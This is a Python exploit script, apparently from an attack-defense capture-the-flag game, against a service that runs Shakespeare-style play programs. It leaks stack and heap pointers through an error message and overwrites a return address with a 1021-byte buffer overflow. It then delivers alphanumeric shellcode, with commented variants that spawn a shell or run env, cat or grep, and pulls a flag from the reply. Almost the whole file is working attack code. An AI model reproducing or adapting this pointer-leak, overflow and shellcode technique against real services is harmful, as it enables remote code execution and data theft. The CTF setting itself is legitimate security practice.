import dongledingler
import re
import random
import string
import socket
import sys
import pexpect
import pexpect.fdpexpect
import setflag
from subprocess import *

with open('include/titles.wordlist') as f:
    titles = [t.strip() for t in f.readlines()]

with open('include/scenes.wordlist') as f:
    scenes = [s.strip() for s in f.readlines()]

with open('include/character.wordlist') as f:
    names = [n.strip() for n in f.readlines()]

with open('include/descriptions.wordlist') as f:
    descriptions = [n.strip() for n in f.readlines()]

def commafy(lst):
    if len(lst) == 1: return lst[0]
    return ", ".join(lst[:-1]) + (", and " if len(lst)>2 else " and ") + lst[-1]

# Shell
#SHELLCODE = 'JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIpjvk2xOi2rE6ph6M1sK9ZGPhFOSC2HePqxvO0b59rNmYispRkXWxGpc0UP4orBQypn6OCCrH30bwF3K9IqjmmPAA'
# env
#SHELLCODE = 'JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrJDKv8j93bcVPhVM1sLIYw3XDoBS1xGpbHVOBBQyRNlIzCrrHh39gpuPeP4oU2PiRNDo2E2NBVWp2wPSlIha8MmPAA'
# cat
#SHELLCODE = 'JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI3Z4KChLYv2RFe8VM0cniiw1xfORSu8UPQxVOE2SYrNNixcRrixfp7pEPC0SSCQ1d5pvORERTas4od0cQ1cbSrWbDwpQGqCLIxaHMopAA'
# grep
SHELLCODE = 'JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIrJdKV8MIrr3V1xfM3Sk9IwsX6OQce87p1xDoqr0irNOy9saB8hTPuPc0EP1w42rE0peptmw8epDnwP1vplQwQOWZGp1GccMYkQjmMPAA'

def setup(ip, port, characters, scene=None):
    c = socket.create_connection((ip,port))

    c.sendall("Henry VI, Part I.\n\n")

    if len(characters) == 2:
        c.sendall("Orsino, a king.\n")
        c.sendall("Lady Capulet, a beast.\n")
    else:
        c.sendall("%s, a dog.\n" % characters[0])

    c.sendall("")


    c.sendall("          Act I: Grubstake Unpromising.\n\n")
    c.sendall("          Scene I: %s.\n\n" % scene or random.choice(scenes))


    c.sendall("[Enter %s]\n\n" % commafy(characters))

    return c

def exploit(ip, port, flag_id):
    characters = [random.choice(names)]
    c = setup(ip, port, characters)

    c.sendall(characters[0] + ":\n")
    c.sendall(" You are as smelly as a fat flirt-gill.\n")
    c.shutdown(socket.SHUT_WR)
    line = c.recv(1024)
    m = re.match(r'Error at line \d+, scene (0x[a-f0-9]{,8}): .+\((0x[a-f0-9]{8})\)', line)
    num_ptr = int(m.groups()[1], 16)
    scene_ptr = int(m.groups()[0], 16) + 0x58
    ret_ptr = num_ptr-8
    ret_ptr_bytes = (ret_ptr>>24, (ret_ptr & 0xff0000)>>16, (ret_ptr & 0xff00)>>8, ret_ptr & 0xff)

    c.close()

    payload = "A"*1021
    payload += ''.join([chr(c) for c in ret_ptr_bytes[::-1]])
    #tmpflag = setflag.set_flag(ip, port, "wateva", list("BB"), list(payload))

    characters = ["Orsino", "Lady Capulet"]
    c = setup(ip, port, characters, SHELLCODE)
    c.sendall(characters[0] + ":\n")

    for x in payload[::-1]:
        c.sendall(dongledingler.shake(x) + "\n")

    c.sendall("Remember the sum of a pony and a Microsoft.\n")

    for x in range(2):
        c.sendall(dongledingler.shake('B') + "\n")

    c.sendall(characters[1] + ":\n")
    c.sendall(" Give me your flag!\n")
    c.sendall(dongledingler.shake(scene_ptr).replace("Remember", "You are") + "\n")

    c.shutdown(socket.SHUT_WR)
    data = ''
    while True:
        d = c.recv(1024)
        if not d:
            break
        data += d

    for line in data.split('\n'):
        try:
            flgid, password, colors = line.split(':')
        except ValueError:
            continue
        if flgid == 'flg_' + flag_id:
            return {'FLAG': colors}

    return None

    # :( :(
    c.sendall("[Exeunt]\n")


    c.close()

if __name__ == "__main__":
    print exploit('127.0.0.1',6666,'ealPBSzE9rGin0RgZQD3')
